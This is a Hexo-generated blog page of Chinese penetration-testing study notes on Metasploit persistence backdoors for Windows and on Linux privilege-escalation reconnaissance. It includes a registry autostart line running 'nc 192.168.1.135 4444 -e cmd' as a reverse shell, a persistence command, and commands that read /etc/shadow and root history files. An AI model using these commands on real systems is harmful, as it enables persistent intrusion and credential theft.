@@ -1,0 +1,244 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+
+  
+  <title>windows后门植入和linux信息搜集 | Hexo</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="windows后门植入持久化的监听: handle: 12345-H    配置RHOST&#x2F;LHOST(用于监听)-P    配置RPORT&#x2F;LPORT(用于监听)-e    指定编码,连接时会对stage进行编码-p    指定一个payload-x    加上这个参数,后台监听就会关闭    持久化后门msf中的持久化后门: run persistence 12345678">
+<meta property="og:type" content="article">
+<meta property="og:title" content="windows后门植入和linux信息搜集">
+<meta property="og:url" content="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="windows后门植入持久化的监听: handle: 12345-H    配置RHOST&#x2F;LHOST(用于监听)-P    配置RPORT&#x2F;LPORT(用于监听)-e    指定编码,连接时会对stage进行编码-p    指定一个payload-x    加上这个参数,后台监听就会关闭    持久化后门msf中的持久化后门: run persistence 12345678">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2021-07-28T13:40:14.000Z">
+<meta property="article:modified_time" content="2021-07-28T13:40:52.005Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+  
+    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 5.0.2"></head>
+
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">Hexo</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-windows后门植入和linux信息搜集" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" class="article-date">
+  <time datetime="2021-07-28T13:40:14.000Z" itemprop="datePublished">2021-07-28</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      windows后门植入和linux信息搜集
+    </h1>
+  
+
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="windows后门植入"><a href="#windows后门植入" class="headerlink" title="windows后门植入"></a>windows后门植入</h1><p>持久化的监听:</p>
+<p>handle:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-H    配置RHOST&#x2F;LHOST(用于监听)</span><br><span class="line">-P    配置RPORT&#x2F;LPORT(用于监听)</span><br><span class="line">-e    指定编码,连接时会对stage进行编码</span><br><span class="line">-p    指定一个payload</span><br><span class="line">-x    加上这个参数,后台监听就会关闭</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="持久化后门"><a href="#持久化后门" class="headerlink" title="持久化后门"></a>持久化后门</h2><p><strong>msf中的持久化后门:</strong></p>
+<p>run persistence</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">-A 自动开启匹配的监听器等待用户连接</span><br><span class="line">-P 指定payload,默认windows/meterpreter/reverse_tcp</span><br><span class="line">-S 开机的时候以服务的方式去运行后门(system权限)</span><br><span class="line">-T 指定一个模板</span><br><span class="line">-U 用户登入的时候做一个反弹</span><br><span class="line">-X 当系统运行的时候做一个反弹</span><br><span class="line">-i 时间间隔(每隔几秒反弹一次)</span><br><span class="line">-p 指定监听的端口</span><br><span class="line">-r 监听器ip</span><br></pre></td></tr></table></figure>
+
+<p><code>example:  run persistence -U -X -i -r LHOST -p LPORT</code></p>
+<p>其他的persistence模块: search persistence</p>
+<p>自启动后门:</p>
+<p><code>注册表的方式&#123;自启动路径很多&#125;、服务的方式&#123;sc 创建服务&#125;、自启动文件夹&#123;shell:startup&#125;,计划任务(只能反弹一次,在指定的时间反弹)</code></p>
+<p><code>注册表的方式: reg add HKLM\.... /v xxx /f /d nc 192.168.1.135 4444 -e cmd</code></p>
+<h2 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h2><h4 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h4><p>id    查看当前的用户所在的组别信息</p>
+<p>uname -a     查看内核版本的全部信息</p>
+<p>cat /proc/version    查看内核版本的全部信息</p>
+<p>cat /etc/*release        查看发行版信息</p>
+<p>dpkg -l                         查看安装包(根据安装的包的版本找漏洞)</p>
+<p>crontab                        计划任务</p>
+<p>​    1.指令的方式: crontab -e 计划任务的内容</p>
+<p>​    2.以文件的形式写计划任务: /etc/crontab ,以这种方式写计划任务,指令看不到内容</p>
+<p>/sbin/ifconfig            查看网络的配置信息</p>
+<p>cat /etc/passwd        普通用户可以查看,内容是账号密码信息(密码放在shadow里)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root:x:0:0:root:&#x2F;root:&#x2F;bin&#x2F;bash</span><br><span class="line">LOGNAME:PASSWORD:UID:GID:USERINFO:HOME:SHELL</span><br><span class="line"></span><br><span class="line">root    用户名</span><br><span class="line">x        占位符--&gt;密码</span><br><span class="line">0        uid</span><br><span class="line">0        gid</span><br><span class="line">root    描述信息</span><br><span class="line">&#x2F;root    家目录</span><br><span class="line">&#x2F;bin&#x2F;bash    执行环境</span><br></pre></td></tr></table></figure>
+
+<p>cat /etc/shadow        特权用户才能查看,存放账号密码信息</p>
+<p>cat /root/.mysql_history    查看数据库历史操作记录</p>
+<p>​    <code>数据库: 查看数据库内容,读取文件,上传文件,提取</code></p>
+<p>cat /root/.bash_history        查看历史操作记录</p>
+<p>find / -perm -u=s -type f 2&gt;/dev/nul    查找具有suid应用程序(默认以root权限执行的程序)</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">find     指令</span><br><span class="line">&#x2F;         根目录(查找位置)</span><br><span class="line">-perm     权限</span><br><span class="line">-u        用户(s&#x3D;特权)</span><br><span class="line">-type    类型</span><br><span class="line">f        文件</span><br><span class="line">2&gt;&#x2F;dev&#x2F;nul    过滤错误信息(不显示错误信息)</span><br></pre></td></tr></table></figure>
+
+<p>​    </p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" data-id="ckrnjds7n000a4wvj47w586gb" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">windows提权</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/07/">July 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/08/">August 2020</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2021/07/28/windows%E5%90%8E%E9%97%A8%E6%A4%8D%E5%85%A5%E5%92%8Clinux%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">windows后门植入和linux信息搜集</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/26/windows%E6%8F%90%E6%9D%83/">windows提权</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/24/meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83/">meterpreter与提权</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/20/MSF-meterpreter/">MSF--meterpreter</a>
+          </li>
+        
+          <li>
+            <a href="/2021/07/18/MSF%E5%9F%BA%E7%A1%80/">MSF基础</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2021 John Doe<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
